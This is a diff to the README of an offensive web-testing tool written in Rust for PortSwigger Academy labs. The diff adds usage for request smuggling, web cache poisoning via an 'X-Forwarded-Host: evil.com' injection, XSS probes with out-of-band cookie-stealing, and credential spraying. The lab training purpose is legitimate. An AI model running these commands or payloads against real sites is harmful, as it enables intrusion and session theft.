@@ -2,7 +2,7 @@
 
 Rust rewrite of [WSAAR](https://github.com/Nishacid/WSAAR).
 
-Runs 18 vulnerability checks across three phases, reconstructs exposed `.git` repositories, and sprays credentials from embedded wordlists.
+Runs 18 vulnerability checks across three phases, reconstructs exposed `.git` repositories, sprays credentials from embedded wordlists, and runs active exploit modules.
 
 > **For authorized use only.** Intended for PortSwigger Web Security Academy labs.
 
@@ -11,10 +11,11 @@ Runs 18 vulnerability checks across three phases, reconstructs exposed `.git` re
 - **Concurrent scanning**: unauthenticated checks run in parallel via `tokio::join!`; authenticated checks follow after login
 - **Git repository reconstruction**: when `/.git/` is exposed, downloads and reconstructs the full repo into `/tmp/rbscp-git-<labid>/`
 - **Credential spray**: username enumeration + password spray using embedded BSCP wordlists
+- **Active exploit modules**: CL.TE request smuggling, web cache poisoning, XSS recon with OOB probes
 - **Proxy support**: `--burp` for one-flag Burp Suite integration; `--proxy` for any HTTP proxy
 - **Custom headers and cookies**: inject session tokens or auth headers without modifying source
 - **JSON output**: machine-readable findings for piping or saving
-- **18 check modules**: covers the full BSCP vulnerability surface
+- **OOB interaction**: blind SSRF/XXE probing via Burp Collaborator or custom endpoints
 
 ## Checks
 
@@ -43,7 +44,7 @@ Runs 18 vulnerability checks across three phases, reconstructs exposed `.git` re
 ## Install
 
 ```sh
-git clone https://github.com/youruser/rustyBSCP
+git clone https://github.com/GRodolphe/rustyBSCP.git
 cd rustyBSCP
 cargo build --release
 # Binary at target/release/rbscp
@@ -51,42 +52,65 @@ cargo build --release
 
 Requires Rust stable (install via [rustup](https://rustup.rs)).
 
+To install the binary into your PATH:
+
+```sh
+cargo install --path .
+```
+
 ## Usage
 
 ```text
 rbscp -i <LAB_ID> [OPTIONS]
 ```
 
-The lab ID is the 32-character hex string from your lab URL:
+The lab ID is the 32-character hex string from your lab URL, or the full URL itself:
 
 ```text
 https://0a1b2c3d4e5f...0000.web-security-academy.net/
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 ```
 
+```sh
+# Both forms work:
+rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d
+rbscp -i https://0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d.web-security-academy.net/
+```
+
 ### Options
 
 ```text
-  -i, --id <ID>            Lab ID (32-char hex)
-  -u, --username <USER>    Username [default: wiener]
-  -p, --password <PASS>    Password [default: peter]
-      --try-carlos         Also try carlos:montoya as fallback credentials
-  -b, --burp               Route through Burp Suite (127.0.0.1:8080)
-      --proxy <URL>        Custom proxy URL (overrides --burp)
-  -H, --header <HEADER>    Custom request header "Name: Value" (repeatable)
-  -C, --cookie <COOKIE>    Custom cookie "name=value" (repeatable)
-      --timeout <SECS>     Request timeout in seconds [default: 15]
-      --json               Output findings as JSON
-  -v, --verbose            Show verbose output
-      --no-color           Disable ANSI colour
-  -o, --output <FILE>      Save JSON findings to file
+  -i, --id <ID>                Lab ID (32-char hex) or full lab URL
+  -u, --username <USER>        Username [default: wiener]
+  -p, --password <PASS>        Password [default: peter]
+      --try-carlos             Also try carlos:montoya as fallback credentials
+  -b, --burp                   Route through Burp Suite (127.0.0.1:8080)
+      --proxy <URL>            Custom proxy URL (overrides --burp)
+  -H, --header <HEADER>        Custom request header "Name: Value" (repeatable)
+  -C, --cookie <COOKIE>        Custom cookie "name=value" (repeatable)
+      --timeout <SECS>         Request timeout in seconds [default: 15]
+      --json                   Output findings as JSON
+  -v, --verbose                Show verbose output
+  -d, --debug                  Show debug output: HTTP codes, skipped endpoints, raw requests
+      --no-color               Disable ANSI colour
+  -o, --output <FILE>          Save JSON findings to file
+      --oob <URL>              OOB interaction URL for blind SSRF/XXE (e.g. Burp Collaborator)
+      --exploit <TYPE>         Run an exploit after scan: clte, wcache, xss
+      --exploit-target <PATH>  Target path for the exploit (e.g. /admin)
+      --exploit-inject <INJ>   Injection vector (header: "X-Forwarded-Host: evil.com"
+                               or param: "utm_content=<script>alert(1)</script>")
+      --exploit-server <URL>   Exploit server URL (auto-derives X-Forwarded-Host for wcache)
+      --exploit-save <FILE>    Save the exploit response body to a file
 ```
 
 ### Examples
 
 ```sh
-# Basic scan
+# Basic scan of a lab
 rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d
+
+# Scan using a full lab URL
+rbscp -i https://0aad006d04f8962f805e535f00ac000a.web-security-academy.net/
 
 # Route through Burp, custom credentials
 rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d --burp -u administrator -p secret
@@ -99,6 +123,56 @@ rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d \
 
 # JSON output for scripting
 rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d --json | jq '.[] | select(.severity == "High")'
+
+# Debug mode (see HTTP status codes for every probe)
+rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d -d
+
+# Blind SSRF/XXE with Burp Collaborator
+rbscp -i 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d --oob https://xyz.oastify.com
+```
+
+## Exploit Modules
+
+After the recon scan, `rbscp` can run active exploit modules to verify findings.
+
+### CL.TE Request Smuggling
+
+Detects conflicting `Content-Length` / `Transfer-Encoding` headers, then optionally smuggles a request to an internal path.
+
+```sh
+# Detection only (G-probe -> 405 check)
+rbscp -i <LAB_ID> --exploit clte
+
+# Smuggle a request to /admin and save the response
+rbscp -i <LAB_ID> --exploit clte --exploit-target /admin --exploit-save admin.html
+```
+
+### Web Cache Poisoning
+
+Stamps a poisoned response into the cache via unkeyed headers or parameters, then verifies the cache serves the payload.
+
+```sh
+# Poison via explicit header injection
+rbscp -i <LAB_ID> --exploit wcache \
+  --exploit-inject "X-Forwarded-Host: evil.com"
+
+# Auto-derive injection from exploit server URL
+rbscp -i <LAB_ID> --exploit wcache \
+  --exploit-server https://exploit-abc.exploit-server.net \
+  --exploit-save poisoned.html
+
+# Poison a specific path
+rbscp -i <LAB_ID> --exploit wcache \
+  --exploit-target /resources/js/tracking.js \
+  --exploit-inject "X-Forwarded-Host: evil.com"
+```
+
+### XSS Recon
+
+XSS reconnaissance (reflection testing, OOB cookie-stealing probes) runs during the scan phase when `--exploit xss` is set. No separate exploit step.
+
+```sh
+rbscp -i <LAB_ID> --exploit xss --oob https://xyz.oastify.com
 ```
 
 ## Git Dump
